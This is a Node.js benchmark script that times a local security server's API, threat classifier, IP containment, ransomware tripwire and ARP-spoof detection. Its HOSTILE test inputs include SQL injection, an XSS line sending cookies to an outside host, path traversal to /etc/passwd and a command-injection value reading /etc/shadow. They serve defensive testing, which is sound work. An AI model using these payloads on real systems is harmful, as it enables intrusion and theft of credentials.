// Speed and responsiveness benchmark against a running Sovereign Defender server.
// Every figure it prints is measured here; nothing is estimated.
//
//   ADMIN_API_KEY=... node audit/perf_benchmark.mjs perf_results.json
//
// Measures: API latency, classifier latency and throughput at 1/10/50/100 concurrent
// requests (unique payloads, so the LRU cache is not what gets timed), containment and
// release through the API, ransomware-tripwire and ARP-spoof time-to-detection, and a
// full audit-chain verification. Writes a JSON file and prints the same.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { performance } from 'node:perf_hooks';

const B = 'http://127.0.0.1:3000';
const KEY = process.env.ADMIN_API_KEY || process.env.SD_KEY;
const OUT = process.argv[2] || 'perf_results.json';
const TMP = process.env.SD_TMP || os.tmpdir();
const auth = { 'x-api-key': KEY };
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function call(method, p, body, headers = auth) {
  const t = performance.now();
  const r = await fetch(B + p, {
    method,
    headers: { 'Content-Type': 'application/json', ...headers },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(30000)
  });
  const text = await r.text();
  const ms = performance.now() - t;
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return { status: r.status, json, ms };
}

const pct = (a, p) => {
  const s = [...a].sort((x, y) => x - y);
  return +s[Math.min(s.length - 1, Math.ceil((p / 100) * s.length) - 1)].toFixed(2);
};
const summary = a => ({ n: a.length, p50: pct(a, 50), p95: pct(a, 95), p99: pct(a, 99), max: +Math.max(...a).toFixed(2) });

const BENIGN = [
  'GET /products?page=2&sort=price',
  'POST /api/v1/tickets {"desc":"printer on floor 3 is offline"}',
  'GET /search?q=quarterly+report+2026',
  'POST /login {"user":"sara","remember":true}'
];
const HOSTILE = [
  "GET /item?id=1' UNION SELECT username,password FROM users--",
  '<script>fetch("https://x.io/c?="+document.cookie)</script>',
  'GET /download?file=../../../../etc/passwd',
  'POST /api/ping {"host":"127.0.0.1; cat /etc/shadow"}'
];
let seq = 0;
// Unique payloads: identical ones are answered from the LRU cache, which would flatter the figure.
const packet = () => {
  const i = seq++;
  const pool = i % 2 ? HOSTILE : BENIGN;
  return {
    packet: {
      srcIp: `198.18.${(i >> 8) & 255}.${i & 255}`,
      vector: 'UNKNOWN',
      payload: `${pool[i % pool.length]} #${i}-${crypto.randomBytes(3).toString('hex')}`,
      threatScore: 50
    }
  };
};

const result = { startedAt: new Date().toISOString(), host: { platform: process.platform, node: process.version } };

// 1. Plain API latency, sequential.
for (let i = 0; i < 20; i++) await call('GET', '/api/health');
result.api = {};
for (const p of ['/api/health', '/api/v1/ebpf/real-stats', '/api/v1/soc/ebpf/containment-records']) {
  const ms = [];
  for (let i = 0; i < 300; i++) ms.push((await call('GET', p)).ms);
  result.api[p] = summary(ms);
}

// 2. Classifier latency, one request at a time.
{
  for (let i = 0; i < 10; i++) await call('POST', '/api/v1/agent/ai-analyze', packet());
  const ms = [];
  let bad = 0;
  for (let i = 0; i < 300; i++) {
    const r = await call('POST', '/api/v1/agent/ai-analyze', packet());
    if (r.status !== 200) bad++;
    ms.push(r.ms);
  }
  result.classifySequential = { ...summary(ms), errors: bad };
}

// 3. Classifier throughput under concurrency.
result.classifyConcurrent = [];
for (const c of [1, 10, 50, 100]) {
  const total = 600;
  const ms = [];
  const codes = {};
  let next = 0;
  const t0 = performance.now();
  await Promise.all(Array.from({ length: c }, async () => {
    while (next < total) {
      next++;
      try {
        const r = await call('POST', '/api/v1/agent/ai-analyze', packet());
        codes[r.status] = (codes[r.status] || 0) + 1;
        ms.push(r.ms);
      } catch (e) {
        codes['ERR'] = (codes['ERR'] || 0) + 1;
      }
    }
  }));
  const secs = (performance.now() - t0) / 1000;
  result.classifyConcurrent.push({ concurrency: c, requests: total, seconds: +secs.toFixed(2), reqPerSec: +(total / secs).toFixed(1), ...summary(ms), statusCodes: codes });
}

// 4. Containment and release, through the API.
{
  const contain = [], release = [];
  for (let i = 1; i <= 20; i++) {
    const ip = `198.51.100.${150 + i}`;
    const a = await call('POST', '/api/v1/soc/ebpf/contain-ip', { targetIp: ip, reason: 'benchmark' });
    const b = await call('POST', '/api/v1/soc/ebpf/release-ip', { targetIp: ip });
    if (a.status === 200 && a.json?.success) contain.push(a.ms);
    if (b.status === 200 && b.json?.success) release.push(b.ms);
  }
  result.containment = { contain: summary(contain), release: summary(release) };
}

// 5. Ransomware tripwire: encrypt a decoy, time until the incident is visible over the API.
{
  const dir = fs.mkdtempSync(path.join(TMP, 'sd-bench-trip-'));
  fs.writeFileSync(path.join(dir, 'notes.txt'), 'ordinary working file');
  const p = await call('POST', '/api/v1/tripwire/protect', { dir });
  const decoys = p.json?.decoys ?? [];
  const lat = [];
  if (decoys.length) {
    await sleep(500);
    for (let k = 0; k < 6; k++) {
      const before = ((await call('GET', '/api/v1/tripwire')).json?.incidents ?? []).length;
      const t = performance.now();
      fs.writeFileSync(decoys[k % decoys.length], crypto.randomBytes(8192));
      for (;;) {
        const inc = (await call('GET', '/api/v1/tripwire')).json?.incidents ?? [];
        if (inc.length > before) { lat.push(performance.now() - t); break; }
        if (performance.now() - t > 10000) break;
        await sleep(10);
      }
      await sleep(600); // let the re-plant settle before the next trial
    }
  }
  await call('POST', '/api/v1/tripwire/unprotect', { dir });
  fs.rmSync(dir, { recursive: true, force: true });
  result.tripwire = lat.length ? { ...summary(lat), trials: 6, detected: lat.length, note: 'includes the 150 ms debounce' } : { error: 'protect failed', status: p.status };
}

// 6. ARP spoofing of the gateway: heartbeat to visible CRITICAL event.
{
  const t = await call('POST', '/api/v1/assets/enrollment-token', { note: 'bench' });
  const e = await call('POST', '/api/v1/assets/enroll', { token: t.json?.token, hostname: 'bench-' + crypto.randomBytes(3).toString('hex') }, {});
  const id = e.json?.asset?.id;
  const A = { Authorization: `Bearer ${e.json?.credential}` };
  const nb = (ip, mac) => ({ ip, mac, vendor: null, viaInterface: null, method: 'ARP_CACHE', discoveredAt: new Date().toISOString() });
  const lat = [];
  for (let k = 0; k < 5; k++) {
    const gw = `10.251.${k}.1`;
    await call('POST', `/api/v1/assets/${id}/heartbeat`, { neighbours: [nb(gw, `02:aa:00:00:0${k}:01`)], gateways: [gw] }, A);
    const evil = `0a:bb:cc:dd:0${k}:99`;
    const t0 = performance.now();
    await call('POST', `/api/v1/assets/${id}/heartbeat`, { neighbours: [nb(gw, evil), nb(`10.251.${k}.66`, evil)], gateways: [gw] }, A);
    const s = await call('GET', '/api/v1/lan-watch');
    const hit = (s.json?.events ?? []).find(x => x.kind === 'ARP_SPOOF_SUSPECTED' && x.assetId === id && x.ip === `10.251.${k}.66`);
    if (hit) lat.push(performance.now() - t0);
  }
  if (id) await call('DELETE', `/api/v1/assets/${id}`);
  result.arpSpoof = { ...summary(lat.length ? lat : [NaN]), trials: 5, detected: lat.length };
}

// 7. Audit trail: verify the whole hash chain.
{
  const r = await call('GET', '/api/v1/audit/verify');
  result.auditVerify = { ms: +r.ms.toFixed(2), ok: r.json?.verification?.ok, entriesChecked: r.json?.verification?.checked };
}

result.finishedAt = new Date().toISOString();
fs.writeFileSync(OUT, JSON.stringify(result, null, 2));
console.log(JSON.stringify(result, null, 1));
